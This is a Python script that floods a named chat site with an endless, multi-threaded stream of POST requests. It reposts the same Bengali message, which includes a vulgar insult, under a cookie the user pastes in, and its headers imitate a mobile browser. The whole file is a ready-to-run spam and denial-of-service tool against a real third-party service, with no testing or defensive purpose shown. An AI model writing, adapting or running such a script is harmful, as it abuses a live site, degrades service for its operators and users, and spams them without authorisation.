import requests
import threading

# Request details
url = "http://meetchat.wapaxo.com/page-3.html?to-id=6"
headers_template = {
    "Host": "meetchat.wapaxo.com",
    "Connection": "keep-alive",
    "Content-Length": "570",
    "Cache-Control": "max-age=0",
    "Origin": "http://meetchat.wapaxo.com",
    "Content-Type": "application/x-www-form-urlencoded",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Linux; Android 13; TECNO BG6 Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.201 Mobile Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "X-Requested-With": "mark.via.gp",
    "Referer": "http://meetchat.wapaxo.com/page-3.html?to-id=6",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "en-US,en;q=0.9",
}
body = "blog_title=%C2%A0+%C2%A0&text=%E0%A6%8F%E0%A6%AE%E0%A6%A8+%E0%A6%95%E0%A7%8B%E0%A6%A8+%E0%A6%AC%E0%A7%8B%E0%A6%95%E0%A6%BE%E0%A6%9A%E0%A7%8B%E0%A6%A6%E0%A6%BE+%E0%A6%86%E0%A6%9B%E0%A7%8B%2C+%E0%A6%AF%E0%A7%87+%E0%A6%86%E0%A6%AE%E0%A6%BE%E0%A6%B0+%E0%A6%B8%E0%A6%BE%E0%A6%A5%E0%A7%87+%E0%A6%86%E0%A6%A1%E0%A7%8D%E0%A6%A1%E0%A6%BE+%E0%A6%A6%E0%A6%BF%E0%A6%AC%E0%A7%87+%F0%9F%98%81&var-photo=https%3A%2F%2Fdl1.axofiles.xyz%2Fdownload%2Fbc3862536b1ccf2c76a2816e4958ec3c%2F7e439830ad88e7a3f209b4390f34238b%2Fmeetchat%2Bwapaxo%2Bcom%2F1734050807736_041925.jpg&blog_submit=Post"

# Function to send requests
def send_request(headers):
    while True:
        try:
            response = requests.post(url, headers=headers, data=body)
            print(f"Response Code: {response.status_code}")
        except Exception as e:
            print(f"Error: {e}")

# Main function
if __name__ == "__main__":
    # Input cookie manually
    user_cookie = input("Enter Cookie (up to 'gat=1'): ")

    # Update headers with cookie
    headers_template["Cookie"] = user_cookie

    # Input thread count
    threads = int(input("Enter number of threads: "))

    # Start threads
    for _ in range(threads):
        thread = threading.Thread(target=send_request, args=(headers_template,))
        thread.start()
